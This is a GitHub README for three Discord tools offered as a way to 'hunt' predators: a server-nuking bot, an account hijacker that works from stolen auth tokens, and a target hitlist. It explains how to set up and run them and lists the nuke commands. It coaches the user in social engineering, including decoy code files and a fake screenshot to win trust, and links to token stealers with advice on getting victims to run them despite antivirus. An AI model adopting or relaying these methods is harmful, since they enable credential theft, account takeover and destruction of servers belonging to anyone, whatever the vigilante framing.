**Notice on custom version:**

I am currently writing a custom version of this tool, that I will primarily use to target predators for YouTube. For anyone wondering, this tool **will** be of private use. I'm afraid I can't give people too much power.

---

**There are currently no known issues. Please report any issues you encounter [here.](https://github.com/Catterall/discord-pedo-hunting-tools/issues)**

---
**⚠️ Vital Warning/Disclaimer⚠️** 

These tools are made for combatting predators. However, it is innevitable that people will use these tools on random people for their own gain. **I am not responsible for how anyone uses these tools, and the consequences of their actions. By using these tools, you accept full responsibility for your actions.**

---
# Discord Pedo-Hunting Tools

[Installation Guide](#installation-guide) | [Anubis Guide](#anubis-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide)
![all three tools](https://user-images.githubusercontent.com/66549839/89476108-b8d5e500-d781-11ea-8534-3c298a073d2a.png)
Discord is a popular social media application used for both messaging and voice chat. It has many unique features such as its iconic "servers". However, due to many variables, discord is also quite popular with child predators and various other degenerates.

Over the years, there have been many people taking this fact as an opportunity to expose those people, with some earning thousands of views. However, there have never really been any tools created to directly combat these individuals... until now.

**Anubis** is a discord nuker, designed specifically to have many helpful features. It also contains various social engineering resources to aid the user in convincing their target to invite the bot to their server. This tool can be used on unsuspecting predator servers to quickly allow you to take control of the server - all you need to do is convince someone to invite the bot (most child predators aren't renowned for their knowledge of code, so convincing them *with* resources should be pretty easy).

**Osiris** is a redesign of the JAJAJA Token Hacker created by [@coats1337](https://github.com/coats1337) (Permission given). It contains a fresh new look and also removes a few commands that, after testing, were found to not work. However, it should be noted that Osiris will be recieving updates in the future adding brand-new features (Unlike Anubis, which is pretty much complete). Osiris can be used to terminate, at least temporarily, a targets account, gain information on them (email + phone number (if connected)) or directly log into their account and take full control. This way, you can swifly remove any problems which the predator is causing in any servers and gain information on them (knowledge is always power).

**Thoth** is a tool designed to keep track of accounts you are targetting - an advanced hitlist, if you will. You can add accounts, remove accounts, display accounts, edit accounts and do pretty much anything else you'd need to do with items on a hitlist. You can even view the JSON containing the accounts in fancy colours (however, it is read only).

These tool's full potential will be discussed in seperate guides further down the README.md file, along with an analysis on how they work, and tips for getting the best results.


---
### Installation Guide
[Introduction](#discord-pedo-hunting-tools) | [Anubis Guide](#anubis-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide)


In order to make the most of this installation guide, please follow the instructions *exactly* as they say.
1. These tools require Python, which can be downloaded [here.](https://www.python.org/downloads/release/python-385/) When installing python, remember to check, "Add Python to PATH" - this is **vital**. After the installation, open the terminal and enter the following command: `pip install asyncpg bs4 colorama discord requests selenium`. These are the dependancies for Anubis and Osiris (They used to be included with the download, but the virtual environment has been quite buggy as of late, for me anyway).

2. **Anubis** requires PostreSQL, which can be downloaded [here.](https://www.enterprisedb.com/downloads/postgres-postgresql-downloads) When installing PostreSQL, do not uncheck any of the checkboxes except the checkbox asking to install Stack Builder. Furthermore, when installing PostreSQL, it will ask you to create a master password. **This password is important, remember it.** If you have no plans on using the Anubis tool, then you can skip to step four. Step three will cover how to set up PostreSQL for Anubis after installed.

3. Search for **pgAdmin 4** in the windows search and run it. Enter the master password whenever it prompts you to enter it. Right click 'databases' at the side and create a new database named `levels_db`. **It must be named levels_db or it fails.** Within the side-explorer for the new, levels_db database, right click 'tables' and create a new table. Name the table `users`. **Again, all naming in this guide must be exact.** Then, move to the columns section. Here, you want to create four new columns; `user_id` should be set to the 'character_varying' datatype and 'Not NULL?'' should be set to yes; `guild_id` should be set to the 'character_varying' datatype as well - you must leave 'Not NULL?' alone for this column and the next two; `lvl` should be set to the 'integer' datatype; `xp` should be set to the 'integer' datatype as well. After these four columns are created, you can click 'save' to save the table, then exit pgAdmin 4.

4. To download the tools, visit the [releases page.](https://github.com/Catterall/discord-pedo-hunting-tools/releases)
5. **If you wish to use Osiris, you must follow this extra step:** 
 Download this specific chrome browser version [here.](https://drive.google.com/file/d/1XfzcEnm9f3yWt9E-V7ZrF_PRvZGjoNka/view?usp=sharing) After downloading the zip file, place it inside the Osiris folder and extract it. There should now be a browser folder within the Osiris folder, which will be used by Osiris. At this point, you can delete the zip file. If you've been following this guide correctly, you should now be ready to use the tools (For those of you wondering, I no longer use LFS/Cloning because 10GB of free broadband transfer a month is nothing). 

---
### Anubis Guide
[Introduction](#discord-pedo-hunting-tools) | [Installation Guide](#installation-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide)

To first use Anubis, run the `main.py` file. You should be greeted with a warning screen - simply press the return (enter) key. You should now notice a new file, named `run_settings.json`. Within this file, there are three settings that you must determine before using Anubis (Open the JSON file with notepad if you have no default program):
1. Replace the default password text with your PostreSQL master password.
2. You must set a bot prefix. Any prefix will do, but try to avoid exceptionally common prefixes, such as !
3. Replace the default token text with your discord bot's token.

Remember to save the file! What's that? You don't currently have a discord bot? Well, luckily for you, setting one up is extremely easy and does not require any downloads. 

Head to the discord developers page [here](https://www.discord.com/developers) and click, "New Application". Name the application with the same name that you will name your bot. After creating the application, look to the left side and click 'Bot'. From here, click 'Add Bot'. Before copying the token, go to 'OAuth 2' and check, 'Bot' in scopes. From here, scroll down a little and check, 'Administrator' in 'Bot Permissions'. Now, head back to the 'Bot' page - you can now copy your bots token and place it in the run_settings.json file.

##### **Using Anubis:**
Anubis has the following commands (the commands will be represented here with a prefix of 'a!'):
- `a!nick_all <nickname>`: This command will change the nickname of every member in a given server.
- `a!mass_dm <message>`: This command will message every member in a given server with a custom message.
- `a!spam <message>`: This command will spam every text channel in a given server with a custom message.
- `a!cpurge`: This command will delete every communication channel in a given server.
- `a!admin <role_name>`: This command will give you a role named <role_name> in a given server; it has admin permissions.
- `a!nuke`: This command will ban all members, delete all roles, delete all channels and delete all emojis of a given server.

All of these commands are usable without permissions, as long as the bot is in the server. However, there are some important considerations to take note of:
- When the bot is invited, it will create its own role. In order for the bot to directly affect a member (nuke, nick_all) its role must be above the member's role. **TL;DR, move the bots role as high as possible by utilising the admin command to give you the permissions to do so.**

- Commands must be used like regular commands - in other words, in a text channel. Pretty much every server has a text channel, although it is best to find one that your sure no one is currently watching. Commands will delete themselves after being entered to help you go further undetected. 

"**But Catterall!**" You shout, "**However will I convince people to add the bot?!**" Well, it's up to you. You can try bribing, you can try bargaining, you can create senses of emergancy - anything, just don't be *too* over-the-top. Remember, whilst you will spend your time reading their psychology, they'll be reading you.

However, there *are* a few resources I haved provided in a Social Engineering folder to help you gain **trust**, the most important thing to possses.
- Multiple .txt files containing all the bots code without the malicious functions.
- A random image of a database screenshot. This is in-case the question the somewhat lack-luster 'add_db' fake command; show them this and they might believe it *more* (Personally, I've never had this occur to me, but I guess it's there if it does).

**Disclaimer: I am not responsible for anyone's actions in regards to the Anubis Tool. If people use it on innocents, I'm not to blame.**

---
### Osiris Guide
[Introduction](#discord-pedo-hunting-tools) | [Installation Guide](#installation-guide) | [Anubis Guide](#anubis-guide) | [Thoth Guide](#thoth-guide)

To use Osiris, run the `main.py` file (not to be confused with Anubis' or Thoth's main.py file). The usage of Osiris is straight-forward, so I'll quickly cover it, then spend most of this guide linking various resources to gaining that crucial holy-grail; the targets Auth token.
- Nuking the targets account will remove their friends, servers, change their language to symbols and, whilst active at least, flick between dark and light mode (although this stops when Osiris is exited). When Osiris asks you for the number of threads, just put **10** or something.

- Finding information on the target will display a few things, but the two most important things are the email and phone number (they may not have a phone number connected).
- Logging into their account will, guess what, log into their account. Just remember to give the selenium browser some time - don't just close it because it didn't login one second to reaching the login page.

#### Token-Gaining Resources:
- [@iklevente's](https://github.com/iklevente) [AnarchyGrabber](https://github.com/iklevente/AnarchyGrabber): Requires Microsoft Visual Studio.
- [@bdunlap9's](https://github.com/bdunlap9) [Discord-Token-Stealer](https://github.com/bdunlap9/Discord-Token-Stealer): Requires Microsoft Visual Studio.
- [@notkohlrexo's](https://github.com/notkohlrexo) [Discord-Token-Stealer](https://github.com/notkohlrexo/Discord-Token-Stealer): Requires Microsoft Visual Studio.

**Notice: These token stealers will be detected by anti-viruses: The question is not how to break into the anti-virus, but how to break into the user's mind; be creative.**

It's up to you which token stealer you use. I'm sure there are some, somewhere, that do not require Visual Studio, but the popular ones do (You can use the community edition). Personally I like [@notkohlrexo's](https://github.com/notkohlrexo) the best for this task, as it displays information such as a general IP, OS, etc. This can give you some, even if limitted, knowledge on the target and remember - knowledge is power.

**Disclaimer: I am not responsible for anyone's actions in regards to the Osiris Tool. If people use it on innocents, I'm not to blame.**

---
### Thoth Guide
[Introduction](#discord-pedo-hunting-tools) | [Installation Guide](#installation-guide) | [Anubis Guide](#anubis-guide) | [Osiris Guide](#osiris-guide)
To use Thoth, run the `main.py` file (not to be confused with Anubis' or Osiris' main.py file). The usage of Thoth, like Osiris, is straight-forwardm so I'll quickly cover it:
- Adding an account will add an account to a JSON file (`accounts.json`). An account contains a code, name, discriminator and (optional) token. The code is anything you like; it is used a reference point for the other commands.

- Removing an account will remove an account from the JSON file if present.
- Editing an account will allow you change the details of an account (the code, name, discriminator and token). You can edit details individually.
- Displaying an account will show you that account's code, name, discriminator and token.
- Checking an account will check to see if the account is in the JSON file.
- Viewing the JSON file will display the contents of the JSON file; prettified with colours (Read only).

When exiting the different options, you may be confused (and agitated) at the random "exit-codes". For example, "Type _exit_thoth_9042_". This is because discord names are unpredictable and, as such, I keep the exit process as random as possible. Exit codes will reset each time you run the tool.

Codes are used as reference points, as stated earlier. For example, when running the remove account option, it will prompt you to enter the code of the account you want to remove. A code can be set as anything, although it would be wise to not attempt to replicate the exit-codes to avoid collision.

**Disclaimer: I am not responsible for anyone's actions in regards to the Thoth Tool. If people use it on innocents, I'm not to blame.**

---
## 🌟 I need your help! 🌠
In order to help my existential crisis, you can **star** this github repository to make me feel better (also, I *think* it helps the search results).

[Introduction](#discord-pedo-hunting-tools) | [Installation Guide](#installation-guide) | [Anubis Guide](#anubis-guide) | [Osiris Guide](#osiris-guide)

